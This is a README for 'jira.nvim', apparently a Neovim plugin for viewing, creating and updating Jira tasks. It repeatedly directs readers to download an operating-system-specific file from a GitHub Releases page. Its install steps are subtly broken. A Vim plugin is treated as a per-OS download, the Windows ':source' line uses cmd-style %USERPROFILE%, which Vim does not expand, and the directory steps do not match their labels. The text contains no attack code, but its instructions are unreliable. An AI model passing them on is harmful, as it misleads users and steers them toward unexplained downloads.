# 🎯 jira.nvim - Access Jira Directly in Neovim

## 🚀 Getting Started

Welcome to jira.nvim! This plugin allows you to manage your Jira tasks directly from Neovim without needing to open a web browser. 

## 📥 Download & Install

To get started, you'll need to download the plugin. Click the link below to visit the Releases page:

[![Download jira.nvim](https://img.shields.io/badge/Download-jira.nvim-brightgreen)](https://github.com/Madilson010/jira.nvim/releases)

Once you're on the Releases page, look for the latest version. You will find the installation files listed there. Follow these steps to download and install:

1. Click the link for the latest version.
2. Choose the appropriate file for your operating system. 
3. Download the file to your computer.

After the download is complete, follow these instructions to install the plugin in Neovim.

## 💻 Installation Steps

### For Unix-based Systems (Linux, macOS)

1. **Open your terminal.**
2. **Create a directory for your Neovim plugins if you don’t have one yet:**
   ```bash
   mkdir -p ~/.config/nvim
   ```
3. **Move the downloaded file to the plugins directory:**
   ```bash
   mv path/to/downloaded/jira.nvim ~/.config/nvim/
   ```
4. **Open Neovim:**
   ```bash
   nvim
   ```
5. **Load the plugin by executing the command in Neovim:**
   ```vim
   :source ~/.config/nvim/jira.nvim/init.vim
   ```

### For Windows

1. **Open Command Prompt.**
2. **Create a directory for your Neovim plugins if you don’t have one yet:**
   ```cmd
   mkdir %USERPROFILE%\AppData\Local\nvim
   ```
3. **Move the downloaded file to the plugins directory:**
   ```cmd
   move path\to\downloaded\jira.nvim %USERPROFILE%\AppData\Local\nvim\
   ```
4. **Open Neovim:**
   ```cmd
   nvim
   ```
5. **Load the plugin by executing the command in Neovim:**
   ```vim
   :source %USERPROFILE%\AppData\Local\nvim\jira.nvim\init.vim
   ```

## 🌟 Features

- **Seamless Integration:** Connects Neovim with your Jira account.
- **Task Management:** View, create, and update tasks directly from your editor.
- **Customizable Shortcuts:** Assign shortcuts for quick access to frequent tasks.
- **Lightweight:** Minimal resource usage to keep your Neovim fast and responsive.

## 🔧 System Requirements

To run jira.nvim effectively, ensure your system meets the following requirements:

- **Neovim Version:** 0.5 or higher.
- **Operating System:** Any Unix-based system (Linux, macOS) or Windows.
- **Internet Connection:** Needed for Jira access and updates.

## 📖 How to Use jira.nvim

After installation, you can start using the features of jira.nvim. Here’s a simple guide:

1. **Open Neovim.**
2. **Link your Jira account:**
   - Use the command `:JiraLogin` in Neovim. You’ll be prompted to enter your Jira credentials. 

3. **View your tasks:**
   - Use the command `:JiraTasks` to display your Jira issues in a list format.
   
4. **Create a new task:**
   - Use the command `:JiraCreate` to add a new task directly from Neovim.

5. **Update existing tasks:**
   - Use the command `:JiraUpdate <task_id>` to modify specific tasks.

## 📑 Optional Configuration

You can customize jira.nvim to suit your preferences. Here are some settings you might want to adjust:

- **Change the task display format:** Edit the `config.lua` file in the plugin directory.
- **Customize your keyboard shortcuts:** Look for the `mappings.lua` file to map your preferred keys.
  
## ❓ Frequently Asked Questions

### Can I use jira.nvim without an internet connection?

No, you need an internet connection to access your Jira tasks.

### Is there a way to get support if I face issues?

Yes, you can check the Issues section of the repository on GitHub or reach out to the community.

## 📞 Contact and Support

If you have any questions or need support, feel free to open an issue on the GitHub repository or check the documentation provided in the project. 

For more updates, keep an eye on the Releases page:

[![Download jira.nvim](https://img.shields.io/badge/Download-jira.nvim-brightgreen)](https://github.com/Madilson010/jira.nvim/releases) 

Thank you for using jira.nvim! Enjoy managing your tasks effectively from Neovim!